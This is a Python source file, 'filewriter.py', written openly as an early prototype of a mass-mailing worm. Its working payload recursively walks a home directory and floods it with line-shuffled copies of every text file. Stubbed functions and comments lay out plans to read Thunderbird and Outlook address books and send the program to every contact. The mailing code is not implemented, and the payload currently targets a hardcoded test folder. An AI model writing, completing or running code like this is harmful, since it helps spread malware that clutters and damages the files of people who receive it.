#!/usr/bin/python

"""
filewriter.py

(c) 2022 telekobold <mail@telekobold.de>

This program was written solely for the joy of exploring how things work
and the intension of sharing accumulated experiences with others. Please
do not abuse it to cause any harm!
"""


# --------------------------------------------------------------------------
# ------------------------------- imports ----------------------------------
# --------------------------------------------------------------------------

from os import listdir
from os.path import expanduser, islink, isdir, isfile
import mimetypes
from random import randint



# --------------------------------------------------------------------------
# -------------------- global variables and constants ----------------------
# --------------------------------------------------------------------------

FILES_TO_WRITE_PER_DIR = 10




# --------------------------------------------------------------------------
# ----------------------- payload helper functions -------------------------
# --------------------------------------------------------------------------

def users_home_dir():
    """
    :returns: the user's home directory on both Unix and Windows platforms
    """
    # return expanduser("~")
    # return "/home/telekobold/TestVerzeichnis/OwnCloud-Test-Kopie" # For testing purposes
    return "/home/telekobold/TestVerzeichnis/Linux-Test-Kopie" # For testing purposes


def is_file_type(file, filetype):
    """
    :file:     a relative or absolute file path
    :filetype: one of the file types "doc", "docx", "jpeg", "jpg", "mp3", "mp4",
               "odt", "ogg", "png", "txt", "wav"
    :returns: `True` if the passed `file` is of the specified file type, false otherwise
    """
    mime_types = {"docx" : "application/vnd.openxmlformats-officedocument.wordprocessingml.document", 
                  "jpeg" : "image/jpeg", 
                  "jpg" : "image/jpeg", 
                  "mp3" : "audio/mpeg", 
                  "mp4" : "video/mp4",
                  "odt" : "application/vnd.oasis.opendocument.text", 
                  "ogg" : "audio/ogg", 
                  "png" : "image/png", 
                  "txt" : "text/plain", 
                  "wav" : "audio/x-wav"}
    if file.endswith(filetype):
        return True
    # TODO: mimetypes.guess_type only guesses the MIME type using the file name extension.
    # Provide function which determines the MIME type without having 
    # the file name extension instead (otherwise, this check doesn't make much sense).
    elif mimetypes.guess_type(file)[0] is mime_types[filetype]:
        return True
    return False


# TODO: Ensure that the function does not simply terminate in the event 
# of an access or write error (e.g. if access rights are missing).
def traverse_dirs(curr_file):
    """
    Recursively traverses all directories and subdirectories
    starting from `curr_file` and calls the appropriate 
    processing function for each file.
    """
    if islink(curr_file):
        print("detected symlink {}".format(curr_file))
        # TODO: Maybe do the same as for directories instead of just ignoring symlinks?
        return
    if isfile(curr_file):
        if is_file_type(curr_file, "txt"):
            # print("TEXT file {}".format(curr_file)) # test output
            process_text_file(curr_file)
        """
        elif is_file_type(curr_file, "docx"):
            print("DOCX file {}".format(curr_file)) # test output
            process_docx_file(curr_file)
        elif is_file_type(curr_file, "odt"):
            print("ODT file {}".format(curr_file)) # test output
            process_odt_file(curr_file)
        elif is_file_type(curr_file, "jpeg") or is_file_type(curr_file, "jpg") or is_file_type(curr_file, "png"):
            print("image file {}".format(curr_file)) # test output
            process_image_file(curr_file)
        elif is_file_type(curr_file, "mp3") or is_file_type(curr_file, "ogg"):
            print("music file {}".format(curr_file)) # test output
            process_music_file(curr_file)
        """
    if isdir(curr_file):
        # print("DIR {}".format(curr_file)) # test output
        for file in listdir(curr_file):
            # TODO: Adapt for Windows ("\" instead of "/").
            traverse_dirs("{}/{}".format(curr_file, file))
            
            
def read_file_to_dict(filename):
    """
    Reads the passed file line by line.
    
    :returns: a dictionary whose keys are the line numbers (integer values) 
              and the appropriate values being the content of this line (string values).
    """
    result = {}
    file = open(filename, "r")
    lines = file.readlines()
    file.close()
    
    # NOTE: The line indexing stars with 0.
    for i, line in zip(range(len(lines)), lines):
        result[i] = line
        
    # print("read_file_to_dict: result = {}".format(result)) # test output
    return result


def shuffle_filename(filename):
    # Determine the lines the text file has and use this number of lines 
    # to randomly shuffle the positions of those lines.
    # TODO: Implement shuffling
    return filename
    
    
def n_rand_numbers(n):
    """
    :n: The length of the list to return.
    :returns: a list of n numbers between 0 and n, randomly shuffled, 
    but unique (meaning that each number appears only once in the list); 
    `None` for n <= 0.
    """
    result = []
    
    if n <= 0:
        print("For n_rand_numbers, only positive values make sense!")
        return None
    while len(result) < n:
        i = randint(0,n)
        if i not in result:
            result.append(i)
    
    return result


def shuffle_dict_content(dictionary):
    """
    :dictionary: an arbitrary dictionary
    :returns: a dictionary which contains all values of the input dictionary, 
              but with randomly shuffled values.
    """
    result = {}
    rand_numbers = n_rand_numbers(len(dictionary)-1)
    # print("shuffle_dict_content(): rand_numbers = {}".format(rand_numbers)) # test output
    
    for i in range(len(dictionary)-1):
        result[i] = dictionary[rand_numbers[i]]
        
    return result


def write_dict_to_file(dictionary, filename):
    """
    Writes every value of `dictionary` to a new line of `file`.
    
    :dictionary: the dictionary that should be written to a file.
    :filename: the name of the file that should be filled with dictionary's content.
    """
    file = open(filename, "w")
    for i in range(len(dictionary)):
        file.writelines(dictionary[i])
    file.close()
    
    
# TODO: Instead of writing the new files to the same directory as the "host" file, 
# write them to any existing directory in the standard user directory.
def process_text_file(input_filename):
    """
    Creates `FILES_TO_WRITE_PER_DIR` new text files where each file contains 
    the content of the text file with `input_filename`, but with randomly shuffled
    content. The new files are created in the same directory as `input_filename`.
    
    :input_filename: The filename of the file that should be duplicated
                     multiple times with shuffled file name and content.
    """
    global FILES_TO_WRITE_PER_DIR
    input_file_content = read_file_to_dict(input_filename)
    
    for i in range(FILES_TO_WRITE_PER_DIR):
        # filename = shuffle_filename(input_filename)
        # TODO: Replace the if-else construct by shuffle_filename usage:
        if input_filename.endswith(".txt"):
            filename = input_filename[0:len(input_filename)-4:1] + str(i) + ".txt"
        else:
            filename = input_filename + str(i)
        file_content = shuffle_dict_content(input_file_content)
        write_dict_to_file(file_content, filename)


def process_docx_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new docx files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass


def process_odt_file(file):
    """
    Produces FILES_TO_WRITE_PER_DIR new odt files where each file contains 
    the content of this text file, but with randomly shuffled content.
    """
    pass

    
def process_image_file(file):
    """
    Tries to recognize content from file name and loads similar pictures 
    from the internet using a startpage search.
    """
    pass


def process_music_file(file):
    """
    Tries to recognize content from file name and metadata and loads similar
    music from the internet using a startpage search.
    """
    pass



# --------------------------------------------------------------------------
# ---------------------- send mail helper functions ------------------------
# --------------------------------------------------------------------------

    
def read_mails_thunderbird():
    pass

def send_mails_thunderbird():
    pass

def read_mails_outlook():
    pass

def send_mails_thunderbird():
    pass



# --------------------------------------------------------------------------
# -------------------------- main functionality ----------------------------
# --------------------------------------------------------------------------

"""
Search all directories and subdirectoris beginning with the passed dir, 
read all files of every browsed directory,
and create FILES_TO_WRITE_PER_DIR new files for every read file
where each file has a randomly generated filename based on the filename of the read file
and containing the content of the read file, but with the words randomly shuffled.
"""
def payload():
    print("Started traversing dirs...") # test output
    traverse_dirs(users_home_dir())
    print("Finished traversing dirs!") # test output

    
"""
Send this program to all email addresses in the address book of the installed Thunderbird or Outlook.
"""
def send_mail():
    pass
    # If Mozilla Thunderbird is installed, read the whole address book from Thunderbird (SQLite database) and send this program to each address of the address book
    # If Outlook is installed, do the same for Outlook. This check only needs to be done if the operating system is Windows.


if __name__ == "__main__":
    # TODO: Start two different threads, one for executing the payload and one for sending emails.
    payload()
    send_mail()
